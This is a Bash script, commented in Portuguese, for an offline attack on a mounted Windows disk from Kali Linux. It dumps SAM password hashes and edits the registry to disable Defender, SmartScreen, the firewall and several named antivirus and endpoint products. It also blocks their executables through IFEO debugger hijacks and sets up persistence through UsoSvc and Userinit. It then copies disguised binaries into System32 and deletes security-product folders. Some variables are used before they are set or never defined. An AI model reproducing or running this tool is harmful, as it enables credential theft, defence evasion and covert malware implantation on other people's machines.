#!/bin/bash

# --- CONFIGURAÇÕES ---
BOT="Windows.exe"
HELPER="Windows_helper.exe"
ASSISTANT="Windows.assistant.exe"
SYS32_REG="C:\\\\Windows\\\\System32"
# Botao de autodestruicao
CLEANER="Windows_cleaner.exe"
# --- CONFIGURAÇÕES DE DESTINO NO KALI ---
POST_EXP_DIR="/home/kali/Desktop/Post_Exploitation"
mkdir -p "$POST_EXP_DIR"

echo "[+] INICIANDO PROTOCOLO OMNI: ACESSO TOTAL & FAILOVER DE MONTAGEM"

# Definição das Hives
SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"

# 1. OPÇÃO DE CAMINHO DIRETO (INPUT PRIORITÁRIO)
echo "[?] Já tens a partição montada? (Ex: /run/media/kali/ID-DO-DISCO)"
echo "[*] Prime ENTER para busca automática ou cola o caminho direto:"
read -p "> " MANUAL_PATH

if [ -n "$MANUAL_PATH" ]; then
    MOUNT_POINT="$MANUAL_PATH"
else
    # 2. LÓGICA DE DETEÇÃO AUTOMÁTICA (MELHORADA)
    echo "[*] Iniciando varredura automática de partições NTFS..."
    
    # Procura em todos os pontos de montagem atuais por qualquer variação de 'ntoskrnl.exe'
    MOUNT_POINT=$(mount | grep -iE "ntfs|fuseblk" | awk '{print $3}' | while read m; do 
        if [ -d "$m" ]; then
            # 'find' com '-iname' ignora Case (SAM vs sam)
            CHECK=$(find "$m" -maxdepth 3 -ipath "*/Windows/System32/ntoskrnl.exe" 2>/dev/null)
            if [ -n "$CHECK" ]; then
                echo "$m"
                break
            fi
        fi
    done)
fi

# 3. VALIDAÇÃO ROBUSTA (AQUI RESOLVEMOS O PROBLEMA DO SAM/sam)
if [ -d "$MOUNT_POINT" ]; then
    echo "[+] A verificar integridade em: $MOUNT_POINT"
    
    # Procuramos os ficheiros de registro sem importar se são maiúsculos ou minúsculos
    REG_PATH=$(find "$MOUNT_POINT" -maxdepth 4 -ipath "*/Windows/System32/config" -type d -print -quit 2>/dev/null)
    
    if [ -n "$REG_PATH" ]; then
        SAM_FILE=$(find "$REG_PATH" -maxdepth 1 -iname "sam" -print -quit)
        SYSTEM_FILE=$(find "$REG_PATH" -maxdepth 1 -iname "system" -print -quit)
        
        if [ -n "$SAM_FILE" ] && [ -n "$SYSTEM_FILE" ]; then
            echo "[SUCCESS] Colmeia de Registos detetada!"
            echo "  -> SAM: $SAM_FILE"
            echo "  -> SYSTEM: $SYSTEM_FILE"
        else
            echo "[-] Erro: Pasta 'config' detetada, mas ficheiros SAM/SYSTEM ausentes ou corrompidos."
            exit 1
        fi
    else
        echo "[-] Erro: Estrutura /Windows/System32/config não encontrada no caminho indicado."
        exit 1
    fi
else
    echo "[!] Erro Crítico: Ponto de montagem inválido ou Windows inacessível."
    exit 1
fi

echo "[*] Alvo pronto para extração de hashes no teu painel C++."

# 2. EXTRAÇÃO DE HASHES (Formatado em Colunas)
samdump2 "$SYSTEM" "$SAM" | column -t -s ":" > "$POST_EXP_DIR/hashes_$(date +%d%m_%H%M).txt"

# 4. NUKE: DEFESAS NATIVAS E EXCLUSÕES
echo "[*] Neutralizando Defender, Firewall e SmartScreen..."
printf "cd Microsoft\\\\Windows Defender\\\\Real-Time Protection\nnv 4 DisableRealtimeMonitoring\ned DisableRealtimeMonitoring\n1\ncd ..\\\\Features\nnv 4 TamperProtection\ned TamperProtection\n0\ncd ..\\\\Exclusions\\\\Paths\nnewkey $SYS32_REG\ncd ..\\\\..\\\\..\\\\Windows\\\\CurrentVersion\\\\Explorer\nnv 4 SmartScreenEnabled\ned SmartScreenEnabled\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

printf "cd ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile\nnv 4 EnableFirewall\ned EnableFirewall\n0\ncd ..\\\\PublicProfile\nnv 4 EnableFirewall\ned EnableFirewall\n0\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# 5. NUKE: DEFESAS DE TERCEIROS E ENDPOINTS (ESET, Trellix, etc.)
echo "[*] Desativando serviços de AVs e Endpoints..."
# Incluídos: ekrn/epfw (ESET) e xagt (Trellix)
AV_LIST=("avp" "avpckcl" "McShield" "mfevtp" "SmadavService" "ekrn" "epfw" "SentinelAgent" "SepMasterService" "xagt")
for svc in "${AV_LIST[@]}"; do
    printf "cd ControlSet001\\\\Services\\\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
done

# 6. BLOQUEIO DE AUTO-REGENERAÇÃO (IFEO)
echo "[*] Aplicando bloqueio IFEO contra reinício de processos..."
BLOCK_LIST=("Smadav.exe" "avp.exe" "McMcAfee.exe" "ekrn.exe" "egui.exe" "MsMpEng.exe" "xagt.exe")
for exe in "${BLOCK_LIST[@]}"; do
    printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\nnewkey $exe\ncd $exe\nnv 1 Debugger\ned Debugger\nsvchost.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
done

# 7. SILENCIAR INTERFACE
echo "[*] Desativando notificações e Central de Ação..."
printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\ImmersiveShell\nnv 4 UseActionCenterExperience\ned UseActionCenterExperience\n0\ncd ..\\\\..\\\\..\\\\Policies\\\\Microsoft\\\\Windows\\\\Explorer\nnv 4 DisableNotificationCenter\ned DisableNotificationCenter\n1\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 8. PERSISTÊNCIA TRIPLA (SYSTEM + USER FAILOVER + NotePad)
echo "[*] Configurando cadeia SYSTEM (Helper) e Failover (Assistant)..."
# SYSTEM via UsoSvc
printf "cd ControlSet001\\\\Services\\\\UsoSvc\nnv 1 ImagePath\ned ImagePath\ncmd /c $SYS32_REG\\\\$HELPER\nnv 4 Start\ned Start\n2\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# USER via Userinit (Hive SOFTWARE)
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,$SYS32_REG\\\\$ASSISTANT\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# USER via notepad.exe (Hive SOFTWARE)
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\notepad.exe,$SYS32_REG\\\\$ASSISTANT\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 9. DEPLOY FINAL COM APAGÃO DE PASTAS
echo "[*] Iniciando Deploy e Nuke físico de diretórios..."
if [ -f "./$BOT" ] && [ -f "./$HELPER" ] && [ -f "./$ASSISTANT" ] ; then
    sudo cp "./$BOT" "$MOUNT_POINT/Windows/System32/"
    sudo cp "./$HELPER" "$MOUNT_POINT/Windows/System32/"
    sudo cp "./$ASSISTANT" "$MOUNT_POINT/Windows/System32/"
    sudo cp "./$CLEANER" "$MOUNT_POINT/Windows/System32/" # Move o Cleaner, mas não inicia
    echo "[*] Auto Destruicao configurada..."

    # Nuke físico abrangente
    rm -rf "$MOUNT_POINT/Program Files/ESET" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files (x86)/ESET" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files (x86)/Smadav" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files/McAfee" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files/Kaspersky Lab" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files/FireEye" &>/dev/null
    
    sync
    echo "[!!!] PROTOCOLO CONCLUÍDO COM SUCESSO."
    echo "[!] Alvo: $MOUNT_POINT | Hashes: $DEST_DIR"
else
    echo "[-] ERRO CRÍTICO: Binários não encontrados."
    exit 1
fi
